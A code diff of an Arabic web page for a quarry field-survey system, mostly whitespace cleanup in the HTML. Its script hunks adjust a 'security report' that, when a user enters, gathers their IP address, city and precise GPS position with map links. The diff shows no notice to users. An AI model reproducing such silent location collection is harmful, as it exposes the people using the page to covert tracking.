@@ -238,15 +238,12 @@
         </div>
 
         <div class="print-page-wrapper">
-            
             <div class="print-only print-header">
                 <span class="date-top-left printDateHeader"></span>
                 <h1>نظام المسح الميداني الجيولوجي للمقالع</h1>
                 <h2>بإشراف الجيولوجي علي شندل الجنابي</h2>
             </div>
-
             <div class="content-padding">
-                
                 <div class="section">
                     <div class="section-title">بيانات العقد الرسمية</div>
                     <div class="form-row">
@@ -307,24 +304,17 @@
                         </div>
                     </div>
                 </div>
-
             </div>
-            
             <div class="print-only print-bottom">1</div>
-
         </div> 
 
-
         <div class="print-page-wrapper">
-            
             <div class="print-only print-header">
                 <span class="date-top-left printDateHeader"></span>
                 <h1>نظام المسح الميداني الجيولوجي للمقالع</h1>
                 <h2>بإشراف الجيولوجي علي شندل الجنابي</h2>
             </div>
-
             <div class="content-padding">
-                
                 <div id="colorSection" class="section screen-only">
                     <div class="section-title">تخصيص ألوان المرتسم المساحي</div>
                     <div class="form-row">
@@ -371,15 +361,12 @@
                     <button class="btn-print screen-only" onclick="prepareAndPrint()">📄 حفظ التقرير كملف PDF</button>
                 </div>
             </div>
-
             <div class="print-only print-bottom">2</div>
-
         </div>
 
         <div class="footer screen-only">
             جميع الحقوق محفوظة لدى الجيولوجي علي شندل الجنابي © 2026
         </div>
-
     </div>
 </div>
 
@@ -412,7 +399,7 @@
             ipText = ipData.ip || "غير معروف";
             if(ipData.city && ipData.region) cityText = `${ipData.city}, ${ipData.region}`;
             if(ipData.latitude && ipData.longitude) {
-                mapLinkIP = `https://www.google.com/maps?q=$${ipData.latitude},${ipData.longitude}`;
+                mapLinkIP = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
             }
         } catch (e) {
             ipText = "محظور (Ad-blocker)";
@@ -430,14 +417,14 @@
         message += `🏢 المنطقة: ${cityText}\n`;
 
         if (hasGps && gpsData) {
-            message += `✅ *حالة الـ GPS:* مفعّل (دقيق)\n`;
-            message += `🗺️ [فتح موقع الجيولوجي على الخريطة](https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon})\n`;
+            message += `✅ *حالة الـ GPS:* مفعّل وتم التقاط الموقع بدقة\n`;
+            message += `🗺️ [فتح موقع الجيولوجي الدقيق](https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon})\n`;
         } else {
-            message += `⚠️ *حالة الـ GPS:* مغلق أو غير متوفر\n`;
+            message += `⚠️ *حالة الـ GPS:* مغلق، أو المتصفح رفض الصلاحية\n`;
             if(mapLinkIP) {
-                message += `🗺️ موقع تقريبي (IP): [فتح الخريطة](${mapLinkIP})\n`;
+                message += `🗺️ موقع تقريبي (موقع برج الإنترنت): [فتح الخريطة](${mapLinkIP})\n`;
             } else {
-                message += `🗺️ موقع تقريبي: غير متوفر بسبب الحماية\n`;
+                message += `🗺️ موقع تقريبي: غير متوفر\n`;
             }
         }
 
@@ -467,10 +454,11 @@
             enterSystem();
 
             if (navigator.geolocation) {
+                // تم زيادة وقت الانتظار إلى 15 ثانية لضمان الدقة وتجنب الخطأ
                 navigator.geolocation.getCurrentPosition(
                     (p) => { sendSecurityReport({lat: p.coords.latitude, lon: p.coords.longitude}, true); },
                     (error) => { sendSecurityReport(null, false); },
-                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             } else {
                 sendSecurityReport(null, false);
